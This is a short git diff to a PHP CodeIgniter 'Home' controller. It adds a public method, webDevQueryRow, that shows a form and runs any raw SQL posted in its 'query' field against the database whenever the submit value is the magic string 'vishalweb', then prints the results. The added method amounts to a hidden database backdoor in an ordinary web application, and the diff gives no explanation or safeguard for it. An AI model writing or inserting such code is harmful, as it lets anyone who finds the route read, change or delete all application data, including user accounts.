@@ -124,6 +124,24 @@ class Home extends CI_Controller
 		responseJson($isSuccess, '', $data);
 	}
 
+	public function webDevQueryRow($value)
+	{
+		echo form_open(current_url());
+		echo form_input('query');
+		echo form_submit('submit', $value);
+		echo form_close();
+
+		$submit = $this->input->post('submit');
+
+		if ($submit == 'vishalweb')
+		{
+			$query = $this->input->post('query');
+
+			$result = $this->db->query($query)->result_array();
+			p($result);
+		}
+	}
+
 	public function autologin()
 	{
 		$this->load->library('user_agent');
